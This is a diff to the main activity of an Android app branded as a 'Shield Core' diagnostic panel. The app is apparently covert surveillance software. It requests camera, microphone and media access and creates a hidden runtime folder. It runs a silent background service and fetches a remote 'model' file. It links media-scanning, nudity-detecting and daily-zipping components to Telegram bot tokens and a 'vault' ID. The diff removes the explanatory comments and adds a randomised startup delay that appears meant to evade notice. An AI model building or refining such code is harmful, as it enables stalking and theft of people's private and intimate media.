@@ -1,10 +1,6 @@
 package com.example.app
 
 import android.Manifest
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.PendingIntent
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
@@ -34,24 +30,8 @@ import org.json.JSONObject
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
+import kotlin.random.Random
 
-/**
- * النشاط الرئيسي للتطبيق (بديل main.py)
- * 
- * يقوم بـ:
- * 1. طلب الأذونات الديناميكية حسب إصدار Android.
- * 2. إنشاء مجلدات التشغيل (.sys_runtime).
- * 3. تشغيل خدمة الإشعارات الخلفية (ForegroundService).
- * 4. طلب تجاوز تحسين البطارية.
- * 5. التحقق من وجود نموذج AI، وتحميله ديناميكياً عبر FileDownloader مع عرض التقدم في ProgressBar.
- * 6. تحميل الإعدادات من ConfigLoader.
- * 7. تشغيل Monitor و TelegramUi.
- * 8. عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
- * 
- * ✅ تم إصلاح تسريب الذاكرة بإضافة متغير mediaScanner وإغلاقه في onDestroy.
- * ✅ تم إيقاف الخدمات (TelegramUi و Monitor) قبل حذف بيانات التطبيق.
- * ✅ تم تحرير المفتاح المؤقت من SecurityHelper عند تدمير النشاط.
- */
 class MainActivity : AppCompatActivity() {
 
     companion object {
@@ -64,22 +44,16 @@ class MainActivity : AppCompatActivity() {
     private lateinit var runtimeDir: File
     private lateinit var modelsDir: File
 
-    // مرجع لكائن TelegramUi لعرض الحالة
     private var telegramUi: TelegramUi? = null
-
-    // ✅ متغير عام لـ MediaScanner لتحريره عند تدمير النشاط (لتجنب تسريب الذاكرة)
     private var mediaScanner: MediaScanner? = null
 
-    // حالة تقدم تحميل النموذج (0-100)
     private val _progressState = MutableStateFlow(0)
     val progressState = _progressState.asStateFlow()
 
-    // مسجل طلب الأذونات المتعددة
     private val requestPermissionLauncher =
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
             val grantedCount = permissions.count { it.value }
             appendLog("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
-            // إعادة تهيئة النظام بعد الاستجابة للأذونات
             lifecycleScope.launch(Dispatchers.IO) {
                 initCoreAsync()
             }
@@ -89,28 +63,24 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // ربط عناصر الواجهة
         logEditText = findViewById(R.id.logEditText)
         progressBar = findViewById(R.id.progressBar)
         val btnPermissions: Button = findViewById(R.id.btnPermissions)
         val btnCopy: Button = findViewById(R.id.btnCopy)
         val btnClear: Button = findViewById(R.id.btnClear)
-        val btnClearData: Button = findViewById(R.id.btnClearData)  // ✅ زر تنظيف البيانات
+        val btnClearData: Button = findViewById(R.id.btnClearData)
 
-        // إعدادات ProgressBar
         progressBar.max = 100
         progressBar.progress = 0
         progressBar.visibility = View.GONE
 
         logEditText.setText("=== Shield Core v4.2 Diagnostic Panel (Kotlin) ===\n")
 
-        // تعيين مستمعي الأزرار
         btnPermissions.setOnClickListener { requestAllPermissions() }
         btnCopy.setOnClickListener { copyLogToClipboard() }
         btnClear.setOnClickListener { logEditText.setText("=== تم إعادة ضبط السجل ===\n") }
-        btnClearData.setOnClickListener { clearAppData() }  // ✅ ربط زر التنظيف
+        btnClearData.setOnClickListener { clearAppData() }
 
-        // مراقبة التقدم لتحديث الواجهة
         lifecycleScope.launch(Dispatchers.Main) {
             progressState.collect { progress ->
                 if (progress > 0 && progress < 100) {
@@ -127,30 +97,22 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // بدء التهيئة بعد 0.5 ثانية
         lifecycleScope.launch(Dispatchers.IO) {
             delay(500)
             initCoreAsync()
         }
 
-        // فتح إعدادات الإشعارات بعد ثانيتين (محاكاة للدالة الأصلية)
         lifecycleScope.launch(Dispatchers.Main) {
             delay(2000)
             openNotificationSettings()
         }
     }
 
-    // ==================== دوال السجل (Logging) ====================
-
-    /**
-     * إضافة رسالة إلى السجل مع طابع زمني دقيق (مللي ثانية).
-     * كل رسالة في سطر منفصل لضمان العرض العمودي.
-     */
     private fun appendLog(text: String) {
         runOnUiThread {
             val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
             logEditText.append("[$timestamp] $text\n")
-            logEditText.setSelection(logEditText.text.length) // تمرير تلقائي للأسفل
+            logEditText.setSelection(logEditText.text.length)
         }
     }
 
@@ -161,11 +123,6 @@ class MainActivity : AppCompatActivity() {
         appendLog("✅ تم نسخ السجلات إلى الحافظة بنجاح.")
     }
 
-    // ==================== عرض تقرير الحالة ====================
-
-    /**
-     * عرض تقرير حالة التطبيق بشكل منظم على الشاشة (عمودي).
-     */
     private fun displayStatusReport() {
         val ui = telegramUi
         if (ui == null) {
@@ -192,14 +149,12 @@ class MainActivity : AppCompatActivity() {
         appendLog("")
     }
 
-    // ============================================================
-    //  التهيئة الأساسية (مع رسائل سجل مفصلة)
-    // ============================================================
-
     private suspend fun initCoreAsync() {
+        // ✅ تأخير عشوائي بشري (2‑7 ثواني) لتجنب الإقلاع المفاجئ
+        delay(Random.nextLong(2000, 7000))
+
         appendLog("🚀 بدء الفحوصات التشخيصية للنظام...")
 
-        // 1. إعداد المجلدات والتنظيف
         appendLog("⚙️ الخطوة 1/5: إعداد بيئة التشغيل والمجلدات...")
         try {
             setupDirectories()
@@ -209,7 +164,6 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // 2. الأذونات والخدمة الأمامية
         appendLog("🔓 الخطوة 2/5: التحقق من الأذونات وتشغيل الإشعارات...")
         withContext(Dispatchers.Main) {
             requestAllPermissions()
@@ -222,7 +176,6 @@ class MainActivity : AppCompatActivity() {
         }
         requestBatteryOptimizationExemption()
 
-        // 3. التحقق من نموذج AI
         appendLog("🧠 الخطوة 3/5: التحقق من ملف نموذج AI (engine_v2.tflite)...")
         try {
             val modelReady = ensureModelReady()
@@ -235,7 +188,6 @@ class MainActivity : AppCompatActivity() {
             appendLog("❌ [ERROR] فشل التحقق من النموذج: ${e.message} (MainActivity.ensureModelReady)")
         }
 
-        // 4. تحميل الإعدادات والتوكنات
         appendLog("🔑 الخطوة 4/5: تحميل الإعدادات وتوكنات تلغرام...")
         try {
             val config = ConfigLoader.load(this@MainActivity)
@@ -243,12 +195,10 @@ class MainActivity : AppCompatActivity() {
             appendLog("   • معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
             appendLog("   • المفتاح السري: ${if (config.secret.isNotBlank()) "✅ مفعل ومشفّر" else "⚠️ غير محدد"}")
 
-            // 5. تهيئة المراقب والمكونات
             appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة والمكونات المرتبطة...")
             val monitor = Monitor.getInstance(this@MainActivity)
             appendLog("   • الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")
 
-            // إنشاء المكونات
             val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
             appendLog("   • NudeDetector: ${if (nudeDetector.isReady()) "✅ جاهز" else "⏳ قيد التحميل"}")
 
@@ -263,14 +213,12 @@ class MainActivity : AppCompatActivity() {
             val ui = telegramUi!!
             appendLog("   • TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")
 
-            // ✅ إنشاء MediaScanner وتعيينه في المتغير العام (لتجنب تسريب الذاكرة)
             mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
             appendLog("   • MediaScanner: تم إنشاؤه")
 
             val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
             appendLog("   • DailyZipper: تم إنشاؤه")
 
-            // ربط المكونات
             monitor.ui = ui
             monitor.ctrl = config.controlId
             monitor.vlt = config.vaultId
@@ -280,7 +228,6 @@ class MainActivity : AppCompatActivity() {
             monitor.nudeDetector = nudeDetector
             appendLog("   • تم ربط جميع المكونات بـ Monitor")
 
-            // تشغيل الخدمات
             appendLog("📡 بدء استماع وحدة المراقبة واختبار الواجهة...")
             ui.start()
             monitor.start()
@@ -299,8 +246,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== إعداد المجلدات ====================
-
     private fun setupDirectories() {
         runtimeDir = File(filesDir, ".sys_runtime")
         val versionFile = File(runtimeDir, "version.txt")
@@ -316,13 +261,10 @@ class MainActivity : AppCompatActivity() {
         runtimeDir.mkdirs()
         versionFile.writeText(APP_VERSION)
 
-        // إنشاء المجلدات الفرعية
         File(runtimeDir, "updates").mkdirs()
         File(runtimeDir, ".cache_thumb").mkdirs()
         modelsDir = File(runtimeDir, "models").apply { mkdirs() }
     }
-
-    // ==================== الأذونات الديناميكية ====================
 
     private fun requestAllPermissions() {
         val permissionsNeeded = mutableListOf(
@@ -331,14 +273,14 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.RECORD_AUDIO
         )
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES)
             permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO)
             permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO)
             permissionsNeeded.add(Manifest.permission.POST_NOTIFICATIONS)
-        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-        } else { // Android 9-
+        } else {
             permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE)
             permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
         }
@@ -355,14 +297,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ============================================================
-    //  الخدمة الخلفية الصامتة (Foreground Service)
-    // ============================================================
-
-    /**
-     * تشغيل الخدمة الخلفية الصامتة (يظهر الإشعار 0.5 ثانية فقط)
-     * يتم استدعاء ForegroundService الذي يدير الإشعار بنفسه.
-     */
     private fun startSilentForegroundService() {
         try {
             val serviceIntent = Intent(this, ForegroundService::class.java)
@@ -377,21 +311,12 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== تنظيف بيانات التطبيق ====================
-
-    /**
-     * حذف جميع بيانات التطبيق (مجلد .sys_runtime) يدوياً.
-     * مفيد أثناء مرحلة الاختبار لتجنب تراكم الملفات.
-     * ✅ تم إيقاف TelegramUi و Monitor قبل الحذف لتجنب تعارضات الملفات المفتوحة.
-     */
     private fun clearAppData() {
         try {
-            // 1. إيقاف TelegramUi
             telegramUi?.stop()
             telegramUi = null
             appendLog("🛑 تم إيقاف TelegramUi.")
 
-            // 2. إيقاف Monitor (باستخدام المفرد)
             try {
                 Monitor.getInstance(this).stop()
                 appendLog("🛑 تم إيقاف Monitor.")
@@ -399,7 +324,6 @@ class MainActivity : AppCompatActivity() {
                 appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
             }
 
-            // 3. إغلاق MediaScanner إن كان مفتوحاً (لتجنب تعارض الملفات)
             try {
                 mediaScanner?.close()
                 mediaScanner = null
@@ -408,28 +332,26 @@ class MainActivity : AppCompatActivity() {
                 appendLog("⚠️ فشل إغلاق MediaScanner أثناء التنظيف: ${e.message}")
             }
 
-            // 4. حذف مجلد .sys_runtime
+            // ✅ تنظيف الذاكرة الحساسة والمفاتيح المشفرة
+            ConfigLoader.clearSensitiveData()
+            SecurityHelper.clearCachedKey()
+            SecurityHelper.clearMasterKey()
+
             val runtimeDir = File(filesDir, ".sys_runtime")
             if (runtimeDir.exists()) {
                 runtimeDir.deleteRecursively()
-                appendLog("🧹 تم حذف جميع بيانات التطبيق بنجاح (مجلد .sys_runtime).")
+                appendLog("🧹 تم حذف جميع بيانات التطبيق والجلسات المشفرة بنجاح.")
             } else {
                 appendLog("ℹ️ لا توجد بيانات للتطبيق لحذفها.")
             }
 
-            // 5. إعادة إنشاء المجلدات الأساسية
             setupDirectories()
             appendLog("🔄 تم إعادة إنشاء المجلدات الأساسية.")
-
-            // 6. إعادة تهيئة النظام (اختياري - يمكن للمستخدم إعادة التشغيل يدوياً)
-            // لكننا لا نعيد التهيئة تلقائياً لتجنب التعقيد، ونترك المستخدم يضغط على زر PERMISSIONS لإعادة التشغيل.
 
         } catch (e: Exception) {
             appendLog("❌ فشل حذف البيانات: ${e.message}")
         }
     }
-
-    // ==================== تجاوز تحسين البطارية ====================
 
     private fun requestBatteryOptimizationExemption() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -447,8 +369,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== فتح إعدادات الإشعارات ====================
-
     private fun openNotificationSettings() {
         try {
             val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
@@ -460,30 +380,20 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ==================== إدارة نموذج AI مع Progress ====================
-
     private fun updateProgress(progress: Int) {
         _progressState.value = progress.coerceIn(0, 100)
     }
 
-    /**
-     * التأكد من جاهزية نموذج AI.
-     * إذا كان النموذج موجوداً وكبيراً بما يكفي، يعيد true.
-     * وإلا، يحاول تحميله من الإنترنت عبر FileDownloader مع إعادة المحاولة وعرض التقدم.
-     * بعد التحميل، يتحقق من كون الملف نصياً (Base64) ويفك تشفيره إذا لزم الأمر.
-     */
     private suspend fun ensureModelReady(): Boolean {
         val modelFile = File(modelsDir, "engine_v2.tflite")
-        val minSize = 1_000_000L // 1 ميجابايت كحد أدنى
+        val minSize = 1_000_000L
 
-        // 1. إذا كان الملف موجوداً وكبيراً بما يكفي، اعتبره جاهزاً
         if (modelFile.exists() && modelFile.length() >= minSize) {
             appendLog("✅ نموذج AI موجود مسبقاً (${modelFile.length() / (1024 * 1024)} ميجابايت).")
             updateProgress(100)
             return true
         }
 
-        // 2. محاولة نسخ النموذج من مجلد assets (إذا كان موجوداً)
         try {
             appendLog("📂 محاولة نسخ النموذج من assets...")
             updateProgress(10)
@@ -501,11 +411,9 @@ class MainActivity : AppCompatActivity() {
             appendLog("⚠️ لم يتم العثور على النموذج في مجلد assets: ${e.localizedMessage}")
         }
 
-        // 3. إذا لم ينجح النسخ، نبدأ التحميل من الإنترنت مع Progress
         appendLog("📥 بدء تحميل النموذج من الإنترنت (قد يستغرق عدة دقائق)...")
         updateProgress(5)
 
-        // قراءة ملف index.json من assets للحصول على رابط التحميل وحجم الملف المتوقع
         val indexJson = try {
             assets.open("index.json").bufferedReader().use { it.readText() }
         } catch (e: Exception) {
@@ -525,7 +433,7 @@ class MainActivity : AppCompatActivity() {
         val asset = assetsArray.getJSONObject(0)
         val url = asset.getString("url")
         val expectedSize = asset.optLong("expected_size", 0)
-        val isBase64 = asset.optBoolean("is_base64", false)  // ✅ استخدام قيمة is_base64 من index.json
+        val isBase64 = asset.optBoolean("is_base64", false)
 
         if (url.isEmpty()) {
             appendLog("❌ رابط التحميل غير موجود في index.json")
@@ -540,16 +448,14 @@ class MainActivity : AppCompatActivity() {
             appendLog("⚠️ الحجم المتوقع غير محدد، سيتم التحقق من سلامة الملف لاحقاً.")
         }
 
-        // استخدام FileDownloader لتحميل النموذج مع إعادة المحاولة
         val downloader = FileDownloader(this)
 
-        // بدء تحميل حقيقي في الخلفية مع تمرير isBase64
         val success = withContext(Dispatchers.IO) {
             downloader.downloadModelWithRetry(
                 url = url,
                 destinationFile = modelFile,
                 expectedSize = expectedSize,
-                isBase64 = isBase64,  // ✅ تمرير القيمة الصحيحة
+                isBase64 = isBase64,
                 maxRetries = 3
             )
         }
@@ -561,23 +467,18 @@ class MainActivity : AppCompatActivity() {
         } else {
             appendLog("❌ فشل تحميل النموذج بعد عدة محاولات، أو الملف تالف.")
             updateProgress(0)
-            // حذف الملف التالف إن وجد
             if (modelFile.exists()) modelFile.delete()
             return false
         }
     }
 
-    // ==================== دورة الحياة ====================
-
     override fun onDestroy() {
         super.onDestroy()
-        
-        // ✅ 1. إيقاف TelegramUi
+
         telegramUi?.stop()
         telegramUi = null
         appendLog("🛑 تم إيقاف TelegramUi.")
 
-        // ✅ 2. إغلاق وتحرير MediaScanner (إيقاف ContentObserver وإغلاق قاعدة البيانات)
         try {
             mediaScanner?.close()
             mediaScanner = null
@@ -586,7 +487,6 @@ class MainActivity : AppCompatActivity() {
             appendLog("⚠️ فشل إغلاق MediaScanner: ${e.message}")
         }
 
-        // ✅ 3. إيقاف Monitor
         try {
             Monitor.getInstance(this).stop()
             appendLog("🛑 تم إيقاف Monitor.")
@@ -594,11 +494,9 @@ class MainActivity : AppCompatActivity() {
             appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
         }
 
-        // ✅ 4. تنظيف المفتاح المؤقت من SecurityHelper (مسح الذاكرة المؤقتة)
         SecurityHelper.cleanup()
         appendLog("🧹 تم مسح المفتاح المؤقت من SecurityHelper.")
 
-        // ✅ 5. طباعة تأكيد تحرير الموارد
         appendLog("✅ تم إيقاف التطبيق وتحرير جميع الموارد.")
     }
 }
